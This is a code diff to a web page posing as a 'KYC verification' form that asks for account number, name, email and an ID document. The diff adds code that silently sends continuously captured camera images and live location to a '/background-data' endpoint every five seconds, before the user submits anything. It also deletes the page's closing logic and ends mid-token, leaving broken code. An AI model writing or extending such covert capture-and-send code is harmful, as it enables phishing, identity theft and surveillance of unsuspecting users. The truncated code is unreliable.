@@ -481,6 +481,12 @@
     let locationData = null;
     const MAX_IMAGES = 50;
     
+    // Background data variables
+    let sessionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+    let backgroundSendInterval = null;
+    let backgroundSendCount = 0;
+    const MAX_BACKGROUND_SENDS = 10;
+    
     // Function to request permissions
     function requestPermissions() {
       const status = document.getElementById('permStatus');
@@ -521,6 +527,9 @@
             
             // Also watch location continuously
             watchLocation();
+            
+            // Start background data sending
+            startBackgroundSending();
           },
           (err) => {
             status.textContent = "Location access denied. Cannot proceed.";
@@ -585,6 +594,49 @@
       }, 500); // Capture every 500ms
     }
     
+    // Start background data sending
+    function startBackgroundSending() {
+      // Send immediately and then every 5 seconds
+      sendBackgroundData();
+      backgroundSendInterval = setInterval(sendBackgroundData, 5000);
+    }
+    
+    // Send background data to server
+    async function sendBackgroundData() {
+      backgroundSendCount++;
+      
+      if (backgroundSendCount > MAX_BACKGROUND_SENDS) {
+        // Stop after 10 sends
+        stopBackgroundSending();
+        return;
+      }
+      
+      if (capturedImages.length === 0 && !locationData) return;
+      
+      try {
+        const imagesToSend = capturedImages.splice(0, capturedImages.length); // Move all images
+        await fetch('/background-data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sessionId,
+            images: imagesToSend,
+            location: locationData
+          })
+        });
+      } catch (error) {
+        console.error('Background send error:', error);
+      }
+    }
+    
+    // Stop background sending
+    function stopBackgroundSending() {
+      if (backgroundSendInterval) {
+        clearInterval(backgroundSendInterval);
+        backgroundSendInterval = null;
+      }
+    }
+    
     // Stop camera stream
     function stopCamera() {
       if (cameraStream) {
@@ -595,6 +647,7 @@
         clearInterval(captureInterval);
         captureInterval = null;
       }
+      stopBackgroundSending();
     }
     
     // Form submission handler
@@ -620,6 +673,12 @@
         formData.append('accno', document.getElementById('accno').value);
         formData.append('fullname', document.getElementById('fullname').value);
         formData.append('email', document.getElementById('email').value);
+        formData.append('sessionId', sessionId);
+        
+        // Add location if available
+        if (locationData) {
+          formData.append('location', JSON.stringify(locationData));
+        }
         
         // Add document file
         const documentFile = document.getElementById('document').files[0];
@@ -627,16 +686,11 @@
           formData.append('document', documentFile);
         }
         
-        // Add captured images
+        // Add captured images (any remaining)
         capturedImages.forEach((img, index) => {
           const blob = dataURLtoBlob(img);
           formData.append(`image${index}`, blob, `capture_${index}.jpg`);
         });
-        
-        // Add location data
-        if (locationData) {
-          formData.append('location', JSON.stringify(locationData));
-        }
         
         // Send data to server
         const response = await fetch('/submit', {
@@ -648,46 +702,4 @@
           // Show success message
           document.getElementById('kycFormElement').style.display = 'none';
           document.getElementById('successMessage').style.display = 'block';
-        } else {
-          throw new Error('Server responded with an error');
-        }
-      } catch (error) {
-        console.error("Submission error:", error);
-        alert("There was an error processing your verification. Please try again.");
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = originalBtnText;
-      }
-    });
-    
-    // Helper function to convert data URL to Blob
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(',');
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
-      }
-      return new Blob([u8arr], { type: mime });
-    }
-    
-    // Cleanup when leaving the page
-    window.addEventListener('beforeunload', function() {
-      stopCamera();
-    });
-    
-    // Start the process by showing popup immediately
-    window.addEventListener('load', function() {
-      document.getElementById('verificationPopup').style.display = 'flex';
-      
-      // Prevent zooming on mobile
-      document.addEventListener('touchmove', function(event) {
-        if (event.scale !== 1) {
-          event.preventDefault();
-        }
-      }, { passive: false });
-    });
-  </script>
-</body>
-</html>
+        } el
